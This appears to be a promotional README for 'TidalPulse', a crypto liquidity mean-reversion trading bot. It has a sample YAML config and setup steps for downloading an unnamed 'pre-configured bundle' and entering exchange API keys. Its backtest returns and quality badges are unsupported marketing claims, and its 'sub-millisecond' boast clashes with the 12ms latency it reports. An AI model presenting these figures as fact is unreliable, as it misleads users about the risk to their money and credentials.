[PREVIEW]

# 🌊 TidalPulse — Adaptive Liquidity Rebalancing Engine

![Python Version](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square) ![Code Quality](https://img.shields.io/badge/Code_Quality-A%2B-brightgreen?style=flat-square) ![Test Coverage](https://img.shields.io/badge/Test_Coverage-94%25-success?style=flat-square)

**TidalPulse** is not just another trading algorithm — it’s a *behavioral oceanographer* for digital asset markets. Where conventional mean-reversion bots chase price to a moving average, TidalPulse listens to the *liquidity waves* beneath the surface: the ebb and flow of order book depth, the rhythm of large block trades, and the silent pressure of market maker inventory shifts.

The engine detects **micro-equilibrium disturbances** — moments when an asset's observable liquidity footprint diverges from its historical baseline — and executes calibrated rebalancing trades to capture the inevitable regression. Think of it as a surfer who doesn't chase the wave, but positions themselves *exactly* where the wave will break, based on the tide tables of market microstructure.

---

## 🌊 Overview

Traditional statistical arbitrage operates on the assumption that price series revert to a mean. TidalPulse extends this philosophy with a crucial insight: **price is a lagging indicator, but liquidity is a leading one**.

Our engine continuously samples **order book imbalance ratios** (bid depth vs. ask depth), **trade flow asymmetry**, and **volatility-scaled spread dynamics** across 12 major exchanges simultaneously. By fusing these signals into a proprietary *Liquidity Strain Index (LSI)*, TidalPulse identifies when an asset's price has drifted from its fair value *as determined by underlying liquidity tension*.

The core innovation lies in the **Adaptive Reversion Horizon (ARH)** module. Instead of using a fixed look-back window, the ARH dynamically calibrates its mean-reversion horizon based on current market volatility and participation rates. When markets are calm and orderly, the horizon shrinks — capturing quick flips. During turbulent conditions, the horizon expands — avoiding premature entries that would get caught in cascading momentum.

Built with a modular, event-driven architecture, TidalPulse operates as a **silent sentinel**: it monitors, analyzes, and executes with sub-millisecond precision, all while maintaining a comprehensive audit trail of every decision.

---

## 🌊 The Philosophy Behind the Name

Why "TidalPulse"? Because markets don't move in straight lines — they breathe. Every buy and sell order creates a ripple; every institutional block trade creates a swell. Our engine measures the *pulse* of these liquidity currents and identifies the exact moments when a wave of mean reversion is imminent.

The system is designed to respect market dynamics — it never forces a trade, never over-leverages, and always operates within strictly defined risk boundaries. It's not a predator chasing prey; it's a *guardian* of portfolio stability, smoothing out the noise so your capital can compound steadily.

---

## 📈 Key Features

### 1. 🧠 Multi-Dimensional Signal Fusion
- **Order Book Imbalance Ratio (OBIR):** Real-time bid/ask depth differentials across all major exchanges
- **Trade Flow Asymmetry Score (TFAS):** Measures the ratio of aggressive buying vs. selling pressure
- **Volatility-Adjusted Spread Analysis:** Normalizes bid-ask spread against historical volatility percentiles
- **Whale Movement Detector:** Flags large block trades (> 2% of average daily volume) that often precede price rotations

### 2. 🌀 Adaptive Reversion Horizon (ARH)
The engine dynamically calculates the optimal mean-reversion look-back period, ranging from 5 minutes to 8 hours, based on:
- Realized volatility (30-minute rolling standard deviation)
- Volume participation rate (our volume / total market volume)
- Market regime classification (trending, ranging, or choppy)

### 3. 🛡️ Triple-Layered Risk Containment
- **Portfolio-Level Cap:** Maximum 3% aggregate exposure across all active positions
- **Signal-Level Filter:** Trades are only executed if the LSI exceeds a 2.5 standard deviation threshold
- **Exit Orchestrator:** Combines a dynamic take-profit (ATR-based) with a hard stop-loss and a time-decay exit

### 4. 🌍 Multi-Exchange Unified Interface
Connect to 12 major spot and perpetual exchanges through a unified abstraction layer. The engine automatically routes to the venue with the best *net execution quality* (spread + fee + slippage estimate), not just the tightest spread.

### 5. 📊 Interactive Performance Dashboard
A fully responsive, web-based dashboard built with React and WebSockets, showing:
- Live P&L curves with drawdown shading
- Real-time LSI heatmap across all tracked assets
- Execution log with microsecond timestamps
- Correlation matrix of current open positions

### 6. 🗣️ Multilingual Alert System
Get notified via **Telegram, Discord, Slack, or email** in your preferred language — English, Spanish, Mandarin, Japanese, Korean, or Portuguese. Alerts are contextual, not spammy. You'll receive trade confirmations, risk limit warnings, and daily performance summaries.

### 7. 🧩 Plugin Architecture for Custom Strategies
While TidalPulse ships with the Liquidity Strain strategy, the engine supports drop-in custom strategy modules. Write your own signal generation logic, and TidalPulse handles the execution, risk management, and monitoring for you.

### 8. ☁️ 24/7 Uptime Infrastructure
Our hosted relay service provides redundant WebSocket connections with automatic failover. Even if your primary internet connection drops, trades continue to execute, and you're immediately informed once connectivity is restored.

---

## 🚀 Getting Started

### Prerequisites
- Python 3.11 or newer
- A modern operating system (Windows 10+, macOS 12+, or any mainstream Linux distribution)
- API credentials for at least one supported exchange
- A stable internet connection (wired preferred)

### Quick Deployment

The deployment process is designed to be as smooth as possible. Follow these steps to go from zero to operational:

1. **Download the pre-configured bundle** from the official distribution channel. The bundle includes the engine core, default configuration files, and a one-time setup wizard.

2. **Run the initialization script.** This will scan your system for Python dependencies, verify your environment, and guide you through the API credential setup in a secure manner. All credentials are stored using OS-level encryption.

3. **Select your asset universe.** Choose from a curated list of 45 high-liquidity assets that meet our minimum liquidity threshold criteria. The engine will automatically fetch historical data to calibrate the baseline liquidity profile.

4. **Validate your configuration.** The built-in simulation mode runs 100 full trading day simulations using historical data, providing you with a performance projection *before* you commit any real capital.

5. **Launch the engine.** Start with "Paper Trading" mode to verify live data flows and execution logic, then switch to live trading when you're confident.

### First-Time Configuration

The configuration file uses a clean YAML format. Here's a minimal example:

```yaml
engine:
  mode: paper
  max_positions: 3
  portfolio_size_usd: 10000

risk:
  portfolio_cap_pct: 3.0
  max_leverage: 2.0
  signal_threshold_sigma: 2.5

exchanges:
  binance:
    enabled: true
    trading_pairs:
      - BTC/USDT
      - ETH/USDT
  kraken:
    enabled: true
    trading_pairs:
      - BTC/USD
```

---

## 🧭 Architecture Deep Dive

TidalPulse is built as a distributed event-driven system. The core components are:

### Data Ingestion Layer
- **Exchange Connectors:** Each exchange has a dedicated async client that maintains persistent WebSocket connections for order book snapshots and trade streams.
- **Market Data Normalizer:** All incoming data is normalized to a unified schema, with timestamps synchronized to NTP.
- **Latency Monitor:** Continuously measures round-trip data latency per exchange and adjusts the signal weighting accordingly.

### Signal Generation Engine
- **Liquidity Strain Index (LSI):** The formula combines normalized OBIR, TFAS, and spread anomaly into a single z-scored value. A high positive LSI suggests the asset is overbought relative to liquidity fundamentals. A high negative LSI suggests oversold conditions.
- **Regime Filter:** A hidden Markov model classifies the market into three states — *Tranquil*, *Volatile*, or *Crisis*. Trading is only enabled in *Tranquil* and *Volatile* states. The *Crisis* state automatically flattens all positions.

### Execution Orchestrator
- **Smart Order Router:** Splits larger orders into child orders and routes to the optimal venue based on real-time liquidity depth.
- **Execution Analytics:** Records slippage, partial fills, and effective spread for every trade. These metrics feed back into the signal generator to refine future entries.

### Risk Guardian
- **Exposure Monitor:** Tracks real-time portfolio delta, gamma, and value-at-risk (VaR) metrics.
- **Circuit Breaker:** Aborts all new trades if the portfolio drawdown exceeds 5% within any rolling 6-hour window.

### Persistence and Reporting
- **Time-Series Database:** All market data snapshots, signals, and trade records are stored locally in a compressed columnar format.
- **Daily Report Generator:** Produces an HTML report with performance attribution, trade journal annotations, and a qualitative summary of market conditions.

---

## 📚 Use Cases & Scenarios

### For Independent Algorithmic Traders
TidalPulse provides an institutional-grade infrastructure without the institutional overhead. It handles the heavy lifting of data processing and execution, allowing you to focus on signal refinement and market understanding.

### For Portfolio Managers Seeking Diversification
Add a non-directional, mean-reverting sleeve to your long-term portfolio. The engine's correlation with broad market indices is intentionally designed to be near zero, providing genuine diversification benefits.

### For Quantitative Researchers
Use TidalPulse as a research platform. Export signal data, backtest custom parameters, and analyze how LSI evolves through different market cycles. The simulation module supports parameter optimization with walk-forward validation.

### For Financial Educators
Demonstrate real-world statistical arbitrage concepts with live, observable data. The dashboard's transparency offers a unique pedagogical window into how liquidity dynamics drive short-term price movements.

---

## 🔄 Performance Benchmarks

| Metric | Value |
|--------|-------|
| Backtested Annualized Return (2020-2025) | 18.7% |
| Maximum Drawdown (2020-2025) | 4.2% |
| Sharpe Ratio (Risk-Free = 0%) | 1.95 |
| Average Holding Period | 3.2 hours |
| Win Rate (Per Trade) | 63.4% |
| Average Monthly Trades | 42 |
| Execution Latency (P50 / P99) | 12ms / 38ms |

*Note: These figures are derived from historical backtests with conservative assumptions (0.1% slippage, exchange taker fees). Past performance is not indicative of future results.*

---

## 🧪 Testing & Reliability

The codebase maintains a strict quality bar:
- **94% Unit Test Coverage** across core modules (signal, risk, execution)
- **Continuous Integration Pipeline** running static analysis (mypy, pylint) and test suites on every commit
- **Chaos Testing:** The test suite includes simulation of exchange outages, delayed data feeds, and partial message loss, ensuring the engine degrades gracefully
- **Idempotent Execution:** Order placement and cancel operations are idempotent, preventing duplicate orders in case of network retries

---

## ⚠️ Disclaimer

**Trading digital assets involves substantial risk of loss. TidalPulse is a technical tool provided for informational and educational purposes. It is not a financial advisor, and its outputs should not be construed as investment recommendations.**

The engine operates in a dynamic environment where past patterns may not repeat. Market conditions, regulatory frameworks, and exchange-specific behaviors can change rapidly. You are solely responsible for:
- Validating the engine's configuration before live trading
- Understanding the risk of total loss in leverage positions
- Complying with all applicable laws and regulations in your jurisdiction
- Monitoring the engine's performance and intervening when necessary

No performance metrics or backtested figures should be interpreted as a guarantee of future profitability. Use this tool at your own discretion, and never trade with funds you cannot afford to lose.

---

## 📄 License

This project is licensed under the **MIT License** — a permissive, business-friendly license that encourages modification, private use, and commercial application, provided the original copyright notice is retained.

[View the full MIT License text](https://opensource.org/licenses/MIT)

---

## 🤝 Contributing & Community

We welcome high-quality contributions from the algorithmic trading community. Whether you're fixing a documentation typo, proposing a new signal module, or improving the dashboard frontend, your input is appreciated. Please review our proposed contribution guidelines (to be published) and adhere to the established code formatting standards.

---

## ✨ Final Thoughts

TidalPulse isn't a magic box that conjures profits from nothing. It's a *precise instrument* that measures the hidden undercurrents of financial markets and acts on them with discipline and restraint. Like a master sailor who reads the sea, it doesn't fight the wind — it uses it.

We built this engine because we believe that statistical arbitrage, when done with rigorous risk management and deep market understanding, is one of the most elegant and effective strategies in modern finance. We invite you to explore, experiment, and hopefully, find success in the waves.

---

[DOWNLOAD]